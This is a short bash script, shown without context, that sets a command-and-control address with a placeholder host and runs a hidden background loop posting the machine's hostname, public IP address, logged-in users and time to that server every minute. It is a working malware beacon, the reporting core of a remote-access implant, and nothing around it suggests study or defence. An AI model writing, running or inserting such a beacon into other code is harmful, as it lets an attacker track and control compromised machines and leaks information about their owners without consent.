C2="http://YOUR_C2:8080/beacon"
while true; do
    DATA=$(curl -s --data "hostname=$(hostname)&ip=$(curl -s ifconfig.me)&users=$(w|head -1)&time=$(date)" $C2)
    sleep 60
done &